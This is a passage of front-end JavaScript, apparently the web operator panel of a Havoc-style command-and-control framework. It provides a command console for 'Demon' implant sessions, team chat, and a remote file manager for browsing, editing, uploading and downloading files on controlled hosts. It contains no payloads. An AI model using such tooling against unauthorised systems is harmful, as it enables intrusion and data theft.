  openTab(`console:${id}`, { kind: "console", demon: id, title: sessionTabTitle(s) });
}
function openFiles(id) {
  const s = S.sessions.get(id);
  if (!s) return;
  openTab(`files:${id}`, { kind: "files", demon: id, title: `[${id}] 文件管理器` });
}
function openProcs(id) {
  const s = S.sessions.get(id);
  if (!s) return;
  openTab(`procs:${id}`, { kind: "procs", demon: id, title: `[${id}] 进程列表` });
}

/* ================================================================
   控制台
   ================================================================ */
function cacheConsoleLine(demon, line) {
  let list = S.consoleCache.get(demon);
  if (!list) { list = []; S.consoleCache.set(demon, list); }
  list.push(line);
  if (list.length > 3000) list.splice(0, list.length - 3000);
}

function renderConsolePane(el, demon) {
  el.innerHTML = `
    <div class="console-wrap">
      <div class="console-out" tabindex="0"></div>
      <div class="console-foot">
        <span class="session-tag"></span>
        <span class="usage"></span>
        <span class="spacer"></span>
        <span class="sleep"></span>
        <span class="task"></span>
      </div>
      <div class="console-input-row">
        <span class="arrow">>>></span>
        <input class="console-input" type="text" spellcheck="false" autocomplete="off"
               placeholder="help 查看全部命令 · Tab 补全 · 需要文件时点右侧上传">
        <button class="console-upload" type="button" title="上传文件到网关并插入服务器路径">上传</button>
      </div>
    </div>`;
  const out = el.querySelector(".console-out");
  const input = el.querySelector(".console-input");
  out.addEventListener("scroll", () => { out.dataset.stick = (out.scrollHeight - out.scrollTop - out.clientHeight < 40) ? "1" : "0"; });

  (S.consoleCache.get(demon) || []).forEach((line) => appendConsoleLine(el, line));
  out.scrollTop = out.scrollHeight;
  updateConsoleFoot(el, demon);

  (async () => {
    try {
      const data = await api(`/api/sessions/${encodeURIComponent(demon)}/console?limit=1200`);
      if (!(S.consoleCache.get(demon) || []).length) {
        (data.lines || []).forEach((line) => { cacheConsoleLine(demon, line); appendConsoleLine(el, line); });
        out.scrollTop = out.scrollHeight;
      }
    } catch (e) { /* ignore */ }
  })();

  input.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter") { ev.preventDefault(); sendConsoleCommand(demon, input); }
    else if (ev.key === "Tab") { ev.preventDefault(); completeConsoleInput(demon, input); }
    else if (ev.key === "ArrowUp") {
      // 输入法组合键（中文候选）不翻历史
      if (ev.isComposing || ev.keyCode === 229) return;
      if (consoleHistoryStep(demon, -1, input)) ev.preventDefault();
    } else if (ev.key === "ArrowDown") {
      if (ev.isComposing || ev.keyCode === 229) return;
      if (consoleHistoryStep(demon, 1, input)) ev.preventDefault();
    }
  });
  input.addEventListener("focus", () => consoleHistoryResetPos(demon));
  const uploadBtn = el.querySelector(".console-upload");
  if (uploadBtn) uploadBtn.addEventListener("click", () => pickConsoleUpload(demon, input));
  input.addEventListener("input", () => updateConsoleUsage(el, input));
  loadCommandMeta().then(() => updateConsoleUsage(el, input));
  consoleHistoryResetPos(demon);
  setTimeout(() => input.focus(), 30);
}

function updateConsoleUsage(el, input) {
  const span = el.querySelector(".console-foot .usage");
  if (!span) return;
  const meta = S.commandMeta || [];
  const tokens = input.value.trim().split(/\s+/).filter(Boolean);
  let text = "";
  if (tokens.length && meta.length) {
    const owner = meta.find((m) => m.name.toLowerCase() === tokens[0].toLowerCase());
    if (owner) {
      if (tokens.length >= 2 && owner.subcommands && owner.subcommands.includes(tokens[1])) {
        const sub = (owner.subcommand_meta || {})[tokens[1]] || {};
        const usage = sub.usage || owner.usage || "";
        text = `${owner.name} ${tokens[1]}${usage ? " " + usage : ""}`;
      } else {
        text = `${owner.name}${owner.usage ? " " + owner.usage : ""}`;
      }
    }
  }
  span.textContent = text ? `Usage: ${text}` : "";
  span.title = text || "";
}

async function loadCommandMeta() {
  if (S.commandMeta) return S.commandMeta;
  try {
    const data = await api("/api/commands");
    S.commandMeta = data.commands || [];
  } catch (e) {
    S.commandMeta = [];
  }
  return S.commandMeta;
}

function _commonPrefix(items) {
  if (!items.length) return "";
  let prefix = items[0];
  for (const item of items.slice(1)) {
    let i = 0;
    while (i < prefix.length && i < item.length && prefix[i] === item[i]) i++;
    prefix = prefix.slice(0, i);
  }
  return prefix;
}

async function completeConsoleInput(demon, input) {
  const meta = await loadCommandMeta();
  const value = input.value;
  const tokens = value.trim().split(/\s+/).filter(Boolean);
  if (!meta.length) return;
  let candidates = [];
  let prefix = "";
  let replaceIndex = 0;
  if (tokens.length === 0) {
    candidates = meta.map((m) => m.name);
  } else if (tokens[0] === "help") {
    const owner = tokens[1] ? meta.find((m) => m.name.toLowerCase() === tokens[1].toLowerCase()) : null;
    if (owner && owner.subcommands && owner.subcommands.length) {
      prefix = tokens[2] || "";
      replaceIndex = 2;
      candidates = owner.subcommands.filter((n) => n.toLowerCase().startsWith(prefix.toLowerCase()));
    } else {
      prefix = tokens[1] || "";
      replaceIndex = 1;
      candidates = meta.map((m) => m.name).filter((n) => n.toLowerCase().startsWith(prefix.toLowerCase()));
    }
  } else if (tokens.length === 1) {
    prefix = tokens[0];
    candidates = meta.map((m) => m.name).filter((n) => n.toLowerCase().startsWith(prefix.toLowerCase()));
  } else {
    const owner = meta.find((m) => m.name.toLowerCase() === tokens[0].toLowerCase());
    if (owner && owner.subcommands && owner.subcommands.length) {
      prefix = tokens[1] || "";
      replaceIndex = 1;
      candidates = owner.subcommands.filter((n) => n.toLowerCase().startsWith(prefix.toLowerCase()));
    }
  }
  if (!candidates.length) return;
  const completion = _commonPrefix(candidates);
  const fill = candidates.length === 1 ? candidates[0] : completion;
  if (!fill || (fill.length <= prefix.length && candidates.length > 1)) {
    toast(`${candidates.length} 个匹配：${candidates.slice(0, 8).join("、")}${candidates.length > 8 ? " …" : ""}`, "info", 5000);
    return;
  }
  if (replaceIndex === 0) {
    input.value = fill + (tokens.length > 1 ? " " + tokens.slice(1).join(" ") : "");
  } else {
    const head = tokens.slice(0, replaceIndex).join(" ");
    input.value = `${head} ${fill}`;
  }
  input.focus();
  input.setSelectionRange(input.value.length, input.value.length);
}

function pickConsoleUpload(demon, input) {
  const picker = document.createElement("input");
  picker.type = "file";
  picker.addEventListener("change", async () => {
    if (!picker.files || !picker.files.length) return;
    const file = picker.files[0];
    const fd = new FormData();
    fd.append("file", file, file.name);
    try {
      const resp = await fetch(`/api/sessions/${encodeURIComponent(demon)}/upload`, {
        method: "POST", body: fd, credentials: "same-origin",
      });
      const data = await resp.json().catch(() => ({}));
      if (!resp.ok || !data.ok) throw new Error(data.message || "上传失败");
      const path = data.path;
      const current = input.value.trim();
      if (!current) input.value = path;
      else input.value = `${current} ${path}`;
      input.focus();
      input.setSelectionRange(input.value.length, input.value.length);
      toast(`已上传 ${data.name}（${data.size} 字节），路径已插入`, "good");
    } catch (err) {
      toast(err.message || "上传失败", "error");
    }
  });
  picker.click();
}

function appendConsoleLine(el, line) {
  const out = el.querySelector(".console-out");
  if (!out) return;
  const stick = out.dataset.stick !== "0";
  const row = document.createElement("div");
  row.className = `console-line ${line.kind || "output"}`;
  const text = stripAnsi(line.text);
  if (line.kind === "prompt") {
    // 客户端 DemonInteracted 的提示行：时间 [用户] Demon » 命令
    const user = (S.conn && S.conn.user) || "operator";
    row.innerHTML = `<span class="pt">${escapeHtml(fmtDateTime(line.ts))} [${escapeHtml(user)}] </span>` +
      `<span class="agent">Demon</span><span class="ar"> » </span><span class="cmd">${escapeHtml(text)}</span>`;
  } else {
    const tx = document.createElement("span");
    tx.className = "tx"; tx.textContent = text;
    row.appendChild(tx);
  }
  out.appendChild(row);
  while (out.childElementCount > 3000) out.removeChild(out.firstChild);
  if (stick) out.scrollTop = out.scrollHeight;
}

function updateConsoleFoot(el, demon) {
  const s = S.sessions.get(demon);
  const tag = el.querySelector(".console-foot .session-tag");
  const sleep = el.querySelector(".console-foot .sleep");
  const task = el.querySelector(".console-foot .task");
  if (!tag) return;
  if (s) {
    const domain = s.domain ? ` (${s.domain})` : "";
    tag.textContent = `[${s.user || "?"}/${s.host || "?"}] ${s.process || ""}/${s.pid || "?"} ${s.proc_arch || ""}${domain}`.replace(/\s+$/, "");
    sleep.textContent = `sleep ${s.sleep != null ? s.sleep : "?"}s / ${s.jitter || 0}%`;
  }
  let last = null;
  for (const t of S.tasks.values()) {
    if (t.demon === demon && (!last || t.updated > last.updated)) last = t;
  }
  task.textContent = last ? `${last.task_id} · ${statusText(last.status)}` : "";
}
function statusText(status) {
  switch (status) {
    case "queued": return "已排队";
    case "sent": return "已下发";
    case "done": return "已完成";
    case "error": return "失败";
    default: return status;
  }
}

async function sendConsoleCommand(demon, input) {
  const command = input.value.trim();
  if (!command) return;
  consoleHistoryPush(demon, command);
  input.value = "";
  if (!S.conn || S.conn.state !== "connected") { toast("网关未连接 teamserver", "error"); return; }
  try {
    await api(`/api/sessions/${encodeURIComponent(demon)}/command`, { method: "POST", body: { command } });
  } catch (err) {
    toast(err.message || "下发失败", "error");
  }
  input.focus();
}

/* ================================================================
   团队聊天
   ================================================================ */
function renderChatPane(el) {
  el.innerHTML = `
    <div class="chat-wrap">
      <div class="chat-list"></div>
      <div class="chat-input-row">
        <span class="chat-user-label"></span>
        <input class="input chat-input" type="text" placeholder="" autocomplete="off">
      </div>
    </div>`;
  const list = el.querySelector(".chat-list");
  if (!S.chat.length) {
    list.innerHTML = `<div class="empty" style="padding:24px">暂无团队消息。发送一条试试。</div>`;
  } else {
    S.chat.forEach((m) => appendChatMessage(el, m));
  }
  list.scrollTop = list.scrollHeight;
  const label = el.querySelector(".chat-user-label");
  label.textContent = (S.conn && S.conn.user) || S.user || "operator";
  const input = el.querySelector(".chat-input");
  const send = async () => {
    const text = input.value.trim();
    if (!text) return;
    input.value = "";
    try { await api("/api/chat", { method: "POST", body: { message: text } }); }
    catch (err) { toast(err.message, "error"); }
    input.focus();
  };
  input.addEventListener("keydown", (ev) => { if (ev.key === "Enter") { ev.preventDefault(); send(); } });
}

function appendChatMessage(el, m) {
  const list = el.querySelector(".chat-list");
  if (!list) return;
  if (list.querySelector(".empty")) list.innerHTML = "";
  const stick = list.scrollHeight - list.scrollTop - list.clientHeight < 40;
  const row = document.createElement("div");
  row.className = "chat-msg";
  const time = escapeHtml(m.time || fmtTime(m.ts));
  const user = escapeHtml(m.user || "?");
  const cls = m.self ? ' class="self"' : "";
  row.innerHTML = `<span class="t">${time}</span> <span class="u">[<u${cls}>${user}</u>]</span>` +
    `<b class="sep"> :: </b><span class="m">${escapeHtml(m.text)}</span>`;
  list.appendChild(row);
  while (list.childElementCount > 1000) list.removeChild(list.firstChild);
  if (stick) list.scrollTop = list.scrollHeight;
}

/* ================================================================
   文件管理器（Windows / Linux 会话：增删改查）
   ================================================================ */
function isLinuxSession(sess) {
  return /linux/i.test(`${(sess && sess.platform) || ""} ${(sess && sess.os) || ""}`);
}
function fileSeparator(demon) {
  return isLinuxSession(S.sessions.get(demon)) ? "/" : "\\";
}
function fileBaseName(path, demon) {
  const p = String(path || "").replace(/[\\/]+$/, "");
  if (!p) return "";
  const idx = Math.max(p.lastIndexOf("\\"), p.lastIndexOf("/"));
  return idx >= 0 ? p.slice(idx + 1) : p;
}
function fileDirName(path, demon) {
  const p = String(path || "").replace(/[\\/]+$/, "");
  const linux = isLinuxSession(S.sessions.get(demon));
  if (!p) return linux ? "/" : ".";
  const idx = Math.max(p.lastIndexOf("\\"), p.lastIndexOf("/"));
  if (idx < 0) return ".";
  if (idx === 0) return "/";
  if (!linux && idx === 2 && /^[A-Za-z]:/.test(p)) return p.slice(0, 3);
  return p.slice(0, idx);
}
function joinPath(base, name, demon) {
  if (!base || base === ".") return name;
  const sep = fileSeparator(demon);
  if (/[\\/]$/.test(base)) return base + name;
  return base + sep + name;
}
function parentPath(path, demon) {
  const linux = isLinuxSession(S.sessions.get(demon));
  const clean = String(path || "").replace(/[\\/]+$/, "");
  if (!clean) return linux ? "/" : ".";
  if (linux) {
    if (clean === "/") return "/";
    const i = clean.lastIndexOf("/");
    if (i < 0) return ".";
    return i === 0 ? "/" : clean.slice(0, i);
  }
  if (/^[A-Za-z]:$/.test(clean)) return clean + "\\";
  if (/^[A-Za-z]:\\$/.test(clean)) return clean;
  const i = Math.max(clean.lastIndexOf("\\"), clean.lastIndexOf("/"));
  if (i < 0) return ".";
  if (i === 2 && /^[A-Za-z]:/.test(clean)) return clean.slice(0, 3);
  return clean.slice(0, i);
}

function renderFilesPane(el, demon) {
  el.innerHTML = `
    <div class="files-wrap" tabindex="0">
      <div class="file-tree">
        <div class="tree-head">文件</div>
        <div class="tree-body"></div>
      </div>
      <div class="h-split" title="拖动调整宽度"></div>
      <div class="file-main">
        <div class="file-toolbar">
          <button class="btn small up-btn" title="上级目录"><img src="/static/img/filebrowser/Folder.png" alt=""></button>
          <input class="input path" type="text" spellcheck="false" placeholder="路径">
          <button class="btn small refresh-btn" title="刷新当前目录">刷新</button>
          <button class="btn small mkdir-btn" title="在当前目录新建文件夹">新建目录</button>
          <button class="btn small newfile-btn" title="在当前目录新建文本文件">新建文件</button>
          <button class="btn small upload-btn" title="上传本地文件到当前目录">上传</button>
          <span class="file-op-status"></span>
          <input class="file-input hidden" type="file" multiple>
        </div>
        <div class="data-table-wrap files-drop">
          <table class="data-table files-table">
            <colgroup><col><col style="width:92px"><col style="width:140px"><col style="width:38px"></colgroup>
            <thead><tr><th>名称</th><th>大小</th><th>修改时间</th><th></th></tr></thead>
            <tbody></tbody>
          </table>
          <div class="file-drop-hint hidden">松开鼠标，上传到当前目录</div>
        </div>
      </div>
    </div>`;
  const pathInput = el.querySelector(".input.path");
  const wrap = el.querySelector(".files-wrap");
  const drop = el.querySelector(".files-drop");
  const input = el.querySelector(".file-input");
  const request = (path) => listFiles(demon, path);

  el.querySelector(".up-btn").addEventListener("click", () => request(parentPath(pathInput.value.trim() || ".", demon)));
  el.querySelector(".refresh-btn").addEventListener("click", () => request(pathInput.value.trim() || "."));
  el.querySelector(".mkdir-btn").addEventListener("click", () => promptNewFolder(demon, pathInput.value.trim() || "."));
  el.querySelector(".newfile-btn").addEventListener("click", () => promptNewFile(demon, pathInput.value.trim() || "."));
  el.querySelector(".upload-btn").addEventListener("click", () => input.click());
  pathInput.addEventListener("keydown", (ev) => { if (ev.key === "Enter") request(pathInput.value.trim() || "."); });

  input.addEventListener("change", async () => {
    const files = Array.from(input.files || []);
    input.value = "";
    if (files.length) await uploadFiles(demon, files, pathInput.value.trim() || ".");
  });

  let dragDepth = 0;
  drop.addEventListener("dragenter", (ev) => {
    if (!ev.dataTransfer || !Array.from(ev.dataTransfer.types || []).includes("Files")) return;
    ev.preventDefault();
    dragDepth += 1;
    drop.classList.add("dragging");
    drop.querySelector(".file-drop-hint").classList.remove("hidden");
  });
  drop.addEventListener("dragover", (ev) => {
    if (ev.dataTransfer && Array.from(ev.dataTransfer.types || []).includes("Files")) ev.preventDefault();
  });
  drop.addEventListener("dragleave", () => {
    dragDepth = Math.max(0, dragDepth - 1);
    if (!dragDepth) {
      drop.classList.remove("dragging");
      drop.querySelector(".file-drop-hint").classList.add("hidden");
    }
  });
  drop.addEventListener("drop", async (ev) => {
    ev.preventDefault();
    dragDepth = 0;
    drop.classList.remove("dragging");
    drop.querySelector(".file-drop-hint").classList.add("hidden");
    const files = Array.from(ev.dataTransfer.files || []);
    if (files.length) await uploadFiles(demon, files, pathInput.value.trim() || ".");
  });

  wrap.addEventListener("keydown", (ev) => {
    if (ev.target && ev.target.matches("input, textarea, select")) return;
    const cache = S.files.get(demon);
    if (!cache || !cache.selected) return;
    const entry = (cache.entries || []).find((x) => x.name === cache.selected);
    if (!entry) return;
    const full = joinPath(cache.path || ".", entry.name, demon);
    if (ev.key === "Delete") { ev.preventDefault(); promptDelete(demon, full, entry); }
    else if (ev.key === "F2") { ev.preventDefault(); promptRename(demon, full, entry); }
    else if (ev.key === "Enter") {
      ev.preventDefault();
      if (String(entry.type).toLowerCase() === "dir") listFiles(demon, full);
      else openFileEditor(demon, full, entry);
    }
  });

  // 拖动左侧文件树宽度
  const hsplit = el.querySelector(".h-split");
  const tree = el.querySelector(".file-tree");
  let drag = false;
  hsplit.addEventListener("mousedown", (ev) => {
    ev.preventDefault();
    drag = true;
    const box = el.querySelector(".files-wrap").getBoundingClientRect();
    const move = (e) => {
      if (!drag) return;
      const w = Math.max(120, Math.min(box.width * 0.6, e.clientX - box.left));
      tree.style.flex = `0 0 ${w}px`;
      tree.style.width = `${w}px`;
    };
    const up = () => {
      drag = false;
      document.removeEventListener("mousemove", move);
      document.removeEventListener("mouseup", up);
    };
    document.addEventListener("mousemove", move);
    document.addEventListener("mouseup", up);
  });
  const cache = S.files.get(demon);
  if (cache) renderFilesTable(el, demon);
  else request(".");
}

function fileTreeRows(path) {
  const clean = String(path || "").replace(/[*]+$/, "").replace(/[\\/]+$/, "");
  if (!clean) return [];
  const isWin = /^[A-Za-z]:/.test(clean) || clean.includes("\\");
  const parts = clean.split(/[\\/]+/).filter(Boolean);
  const rows = [];
  let acc = "";
  if (isWin && /^[A-Za-z]:$/.test(parts[0] || "")) {
    acc = parts.shift() + "\\";
    rows.push({ name: acc, path: acc, level: 0 });
  } else if (!isWin) {
    acc = "/";
    rows.push({ name: "/", path: "/", level: 0 });
  }
  parts.forEach((part) => {
    acc = /[\\/]$/.test(acc) ? acc + part : acc + (isWin ? "\\" : "/") + part;
    rows.push({ name: part, path: acc, level: rows.length });
  });
  return rows;
}

function renderFileTree(el, demon) {
  const cache = S.files.get(demon);
  const body = el.querySelector(".tree-body");
  if (!body) return;
  if (!cache || !cache.path) { body.innerHTML = ""; return; }
  const rows = fileTreeRows(cache.path);
  body.innerHTML = rows.map((r, i) => `
    <div class="tree-row${i === rows.length - 1 ? " selected" : ""}" data-path="${escapeHtml(r.path)}" style="padding-left:${6 + r.level * 20}px">
      <span class="tw-arrow">${i === rows.length - 1 ? "" : "▾"}</span>
      <img class="tw-icon" src="/static/img/filebrowser/${r.level === 0 ? "HardDisk.png" : "Folder.png"}" alt="">
      <span class="tw-text">${escapeHtml(r.name)}</span>
    </div>`).join("");
  body.querySelectorAll(".tree-row").forEach((row) => {
    row.addEventListener("click", () => listFiles(demon, row.getAttribute("data-path")));
  });
}

function renderFilesTable(el, demon) {
  const cache = S.files.get(demon);
  const tbody = el.querySelector(".data-table tbody");
  const pathInput = el.querySelector(".input.path");
  if (!tbody) return;
  if (!cache) { tbody.innerHTML = `<tr><td colspan="4" class="muted">加载中…</td></tr>`; return; }
  pathInput.value = cache.path || "";
  renderFileTree(el, demon);
  const entries = (cache.entries || []).slice().sort((a, b) => {
    const ad = String(a.type).toLowerCase() === "dir" ? 0 : 1;
    const bd = String(b.type).toLowerCase() === "dir" ? 0 : 1;
    if (ad !== bd) return ad - bd;
    return String(a.name).localeCompare(String(b.name), "zh-CN", { numeric: true, sensitivity: "base" });
  });
  if (!entries.length) {
    tbody.innerHTML = `<tr><td colspan="4" class="muted">目录为空，可右键或使用工具栏新建/上传</td></tr>`;
    return;
  }
  tbody.innerHTML = entries.map((f) => {
    const isDir = String(f.type).toLowerCase() === "dir";
    const icon = isDir ? "Folder.png" : "File.png";
    const selected = cache.selected === f.name ? " selected" : "";
    return `<tr class="${isDir ? "dir" : "file"}${selected}" data-name="${escapeHtml(f.name)}" data-type="${escapeHtml(f.type)}">
      <td class="name"><img class="file-icon" src="/static/img/filebrowser/${icon}" alt="">${escapeHtml(f.name)}</td>
      <td class="muted">${isDir ? "" : escapeHtml(f.size || "")}</td>
      <td class="muted">${escapeHtml(f.modified || "")}</td>
      <td class="row-actions"><button class="file-more" title="文件操作">⋯</button></td>
    </tr>`;
  }).join("");
  const selectRow = (tr) => {
    const name = tr.getAttribute("data-name");
    cache.selected = name;
    tbody.querySelectorAll("tr").forEach((row) => row.classList.toggle("selected", row === tr));
  };
  tbody.querySelectorAll("tr").forEach((tr) => {
    const name = tr.getAttribute("data-name");
    if (!name) return;
    const type = tr.getAttribute("data-type");
    const full = joinPath(cache.path || ".", name, demon);
    const entry = { name, type, size: "", modified: "" };
    const source = entries.find((x) => x.name === name);
    if (source) { entry.size = source.size; entry.modified = source.modified; }
    tr.addEventListener("click", () => { selectRow(tr); });
    tr.addEventListener("dblclick", () => {
      if (String(type).toLowerCase() === "dir") listFiles(demon, full);
      else openFileEditor(demon, full, entry);
    });
    tr.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      selectRow(tr);
      showFileMenu(ev.clientX, ev.clientY, demon, full, entry);
    });
    const more = tr.querySelector(".file-more");
    more.addEventListener("click", (ev) => {
      ev.stopPropagation();
      selectRow(tr);
      const r = more.getBoundingClientRect();
      showFileMenu(r.left, r.bottom + 2, demon, full, entry);
    });
  });
}

function showFileMenu(x, y, demon, full, entry) {
  const isDir = String(entry.type).toLowerCase() === "dir";
  const items = [
    { label: isDir ? "打开" : "编辑", action: () => (isDir ? listFiles(demon, full) : openFileEditor(demon, full, entry)) },
    { label: "下载", disabled: isDir, action: () => downloadFile(demon, full, entry.name) },
    { sep: true },
    { label: "重命名", action: () => promptRename(demon, full, entry) },
    { label: "复制到…", action: () => promptCopyTo(demon, full, entry) },
    { label: "移动到…", action: () => promptMoveTo(demon, full, entry) },
    { label: "删除", action: () => promptDelete(demon, full, entry) },
    { sep: true },
    { label: "复制路径", action: () => copyText(full) },
    { label: "属性", action: () => showFileProps(demon, full, entry) },
  ];
  showContextMenu(x, y, items);
}

function setFileStatus(demon, text, isError = false) {
  const tab = S.tabs.get(`files:${demon}`);
  if (!tab) return;
  const el = tab.el.querySelector(".file-op-status");
  if (!el) return;
  el.textContent = text || "";
  el.classList.toggle("error", !!isError);
}

async function listFiles(demon, path) {
  const seq = (S.filesSeq.get(demon) || 0) + 1;
  S.filesSeq.set(demon, seq);
  setFileStatus(demon, "载入中…");
  try {
    const res = await api(`/api/sessions/${encodeURIComponent(demon)}/files`, { method: "POST", body: { path } });
    if (seq !== (S.filesSeq.get(demon) || 0)) return;  // 已有更新的目录请求
    const actual = res.path || path;
    const prev = S.files.get(demon);
    S.files.set(demon, {
      path: actual, entries: res.entries || [], ts: now(),
      selected: prev && prev.path === actual ? prev.selected : null,
    });
    const tab = S.tabs.get(`files:${demon}`);
    if (tab) renderFilesTable(tab.el, demon);
    setFileStatus(demon, "");
  } catch (err) {
    if (seq !== (S.filesSeq.get(demon) || 0)) return;
    setFileStatus(demon, err.message, true);
    toast(err.message, "error");
  }
}

async function downloadFile(demon, path, name) {
  const filename = name || fileBaseName(path, demon) || "download.bin";
  try {
    setFileStatus(demon, `下载 ${filename}…`);
    const res = await fetch(`/api/sessions/${encodeURIComponent(demon)}/files/download?path=${encodeURIComponent(path)}`,
      { credentials: "same-origin" });
    if (!res.ok) {
      let data = null;
      try { data = await res.json(); } catch (e) { data = null; }
      throw new Error((data && (data.message || data.error)) || `HTTP ${res.status}`);
    }
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 2000);
    setFileStatus(demon, "");
    toast(`已下载 ${filename}（${blob.size} 字节）`, "good");
  } catch (err) {
    setFileStatus(demon, err.message, true);
    toast(err.message, "error");
  }
}

function setModalError(modal, text) {
  let el = modal.querySelector(".modal-error");
  if (!el) {
    el = document.createElement("div");
    el.className = "modal-error";
    modal.querySelector(".modal-body").appendChild(el);
  }
  el.textContent = text || "";
  el.classList.toggle("hidden", !text);
}

async function promptNewFolder(demon, dir) {
  const modal = openModal("新建目录", `
    <div class="form-grid">
      <label>所在目录</label><div class="muted mono small-text">${escapeHtml(dir)}</div>
      <label>目录名称</label><input class="input fm-name" type="text" spellcheck="false" placeholder="例如 logs">
    </div>
    <p class="modal-note">只创建一级目录；上级目录必须已存在。</p>`, [
    { label: "取消", action: closeModal },
    { label: "创建", primary: true, action: async (m) => {
      const name = m.querySelector(".fm-name").value.trim();
      if (!name) { setModalError(m, "请输入目录名称"); return; }
      if (/[\\/]/.test(name) || name === "." || name === "..") { setModalError(m, "名称不能包含路径分隔符"); return; }
      const target = joinPath(dir, name, demon);
      const btn = m.querySelector(".modal-foot .btn:last-child");
      btn.disabled = true; btn.textContent = "创建中…";
      try {
        await api(`/api/sessions/${encodeURIComponent(demon)}/files/mkdir`, { method: "POST", body: { path: target } });
        closeModal();
        toast(`已创建目录：${target}`, "good");
        await listFiles(demon, dir);
      } catch (err) {
        setModalError(m, err.message);
        btn.disabled = false; btn.textContent = "创建";
      }
    } },
  ]);
  modal.querySelector(".fm-name").focus();
}

async function promptNewFile(demon, dir) {
  const modal = openModal("新建文件", `
    <div class="form-grid">
      <label>所在目录</label><div class="muted mono small-text">${escapeHtml(dir)}</div>
      <label>文件名</label><input class="input fm-name" type="text" spellcheck="false" placeholder="例如 note.txt">
    </div>
    <label class="fm-label">初始内容（可留空）</label>
    <textarea class="input fm-content" spellcheck="false" placeholder="UTF-8 文本"></textarea>
    <p class="modal-note">保存时会覆盖同名文件（Windows 下先备份再写入，失败自动回滚）。</p>`, [
    { label: "取消", action: closeModal },
    { label: "创建", primary: true, action: async (m) => {
      const name = m.querySelector(".fm-name").value.trim();
      if (!name) { setModalError(m, "请输入文件名"); return; }
      if (/[\\/]/.test(name) || name === "." || name === "..") { setModalError(m, "文件名不能包含路径分隔符"); return; }
      const target = joinPath(dir, name, demon);
      const content = m.querySelector(".fm-content").value;
      const btn = m.querySelector(".modal-foot .btn:last-child");
      btn.disabled = true; btn.textContent = "创建中…";
      try {
        await api(`/api/sessions/${encodeURIComponent(demon)}/files/write`, {
          method: "POST", body: { path: target, content, encoding: "utf-8" },
        });
        closeModal();
        toast(`已创建文件：${target}`, "good");
        await listFiles(demon, dir);
      } catch (err) {
        setModalError(m, err.message);
        btn.disabled = false; btn.textContent = "创建";
      }
    } },
  ]);
  modal.querySelector(".fm-name").focus();
}

async function openFileEditor(demon, path, entry) {
  let res = null;
  try {
    res = await api(`/api/sessions/${encodeURIComponent(demon)}/files/read?path=${encodeURIComponent(path)}`);
  } catch (err) {
    toast(`读取失败：${err.message}`, "error");
    return;
  }
  const name = fileBaseName(path, demon) || path;
  const meta = res.binary
    ? "二进制文件，无法文本编辑"
    : res.too_large
      ? `文件 ${res.size} 字节，超过在线编辑上限 ${res.limit} 字节`
      : `${res.size} 字节 · ${res.encoding || "utf-8"}`;
  const editable = !res.binary && !res.too_large;
  let dirty = false;
  const modal = openModal(`编辑 ${name}`, `
    <div class="file-editor-meta"><span class="mono">${escapeHtml(path)}</span><span>${escapeHtml(meta)}</span></div>
    ${editable
      ? `<textarea class="input file-editor-text" spellcheck="false"></textarea>`
      : `<p class="modal-note">${res.binary ? "该文件包含二进制内容，为避免损坏未加载文本。" : "文件过大，未加载内容。"} 可点击“下载”保存到本地。</p>`}
    <p class="modal-note">保存会整体覆盖目标文件；Windows Demon 会先备份原文件，失败时自动回滚。</p>`, [
    { label: "下载", action: () => downloadFile(demon, path, name) },
    { label: "关闭", action: closeModal },
    { label: "保存", primary: true, action: async (m) => {
      if (!editable) return;
      const content = m.querySelector(".file-editor-text").value;
      const btn = m.querySelector(".modal-foot .btn:last-child");
      btn.disabled = true; btn.textContent = "保存中…";
      try {
        const out = await api(`/api/sessions/${encodeURIComponent(demon)}/files/write`, {
          method: "POST", body: { path, content, encoding: res.encoding || "utf-8" },
        });
        dirty = false;
        closeModal();
        toast(`已保存 ${name}（${out.size} 字节）`, "good");
        if (out.warning) toast(out.warning, "warn", 7000);
        await listFiles(demon, fileDirName(path, demon));
      } catch (err) {
        setModalError(m, err.message);
        btn.disabled = false; btn.textContent = "保存";
      }
    } },
  ], {
    className: "file-editor-modal",
    onClose: () => {
      if (dirty && !window.confirm("内容尚未保存，确定关闭？")) return false;
      return true;
    },
  });
  if (!editable) {
    const saveBtn = modal.querySelector(".modal-foot .btn.primary");
    if (saveBtn) saveBtn.disabled = true;
  }
  if (editable) {
    const ta = modal.querySelector(".file-editor-text");
    ta.value = res.content || "";
    ta.addEventListener("input", () => { dirty = true; });
    ta.addEventListener("keydown", (ev) => {
      if ((ev.ctrlKey || ev.metaKey) && ev.key.toLowerCase() === "s") {
        ev.preventDefault();
        modal.querySelector(".modal-foot .btn:last-child").click();
      }
    });
    setTimeout(() => ta.focus(), 30);
  }
}

async function promptRename(demon, path, entry) {
  const old = entry.name || fileBaseName(path, demon);
  const modal = openModal(`重命名 ${old}`, `
    <div class="form-grid">
      <label>所在目录</label><div class="muted mono small-text">${escapeHtml(fileDirName(path, demon))}</div>
      <label>新名称</label><input class="input fm-name" type="text" spellcheck="false" value="${escapeHtml(old)}">
    </div>
    <p class="modal-note">只改名，不移动目录；目标已存在时不会覆盖。</p>`, [
    { label: "取消", action: closeModal },
    { label: "重命名", primary: true, action: async (m) => {
      const name = m.querySelector(".fm-name").value.trim();
      if (!name) { setModalError(m, "请输入新名称"); return; }
      if (/[\\/]/.test(name) || name === "." || name === "..") { setModalError(m, "名称不能包含路径分隔符"); return; }
      const target = joinPath(fileDirName(path, demon), name, demon);
      const btn = m.querySelector(".modal-foot .btn:last-child");
      btn.disabled = true; btn.textContent = "重命名中…";
      try {
        await api(`/api/sessions/${encodeURIComponent(demon)}/files/move`, {
          method: "POST", body: { from: path, to: target },
        });
        closeModal();
        toast(`已重命名为 ${name}`, "good");
        await listFiles(demon, fileDirName(path, demon));
      } catch (err) {
        setModalError(m, err.message);
        btn.disabled = false; btn.textContent = "重命名";
      }
    } },
  ]);
  const input = modal.querySelector(".fm-name");
  input.focus();
  const dot = old.lastIndexOf(".");
  input.setSelectionRange(0, dot > 0 ? dot : old.length);
}

async function promptCopyTo(demon, path, entry) {
  const dir = fileDirName(path, demon);
  const defaultTarget = joinPath(dir, (entry.name || "copy") + " - 副本", demon);
  const modal = openModal("复制到…", `
    <div class="form-grid">
      <label>源路径</label><div class="muted mono small-text">${escapeHtml(path)}</div>
